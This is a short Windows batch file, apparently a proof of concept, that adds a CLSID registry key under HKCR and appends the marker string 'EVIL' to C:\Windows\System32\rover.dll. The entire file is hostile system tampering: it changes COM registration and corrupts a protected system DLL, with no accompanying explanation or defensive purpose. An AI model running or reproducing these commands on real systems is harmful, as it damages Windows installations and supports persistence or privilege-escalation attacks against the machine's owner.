@echo off
reg add "HKCR\CLSID\{16d12736-7a9e-4765-bec6-f301d679caaa}" /f
echo "EVIL" >> C:\Windows\System32\rover.dll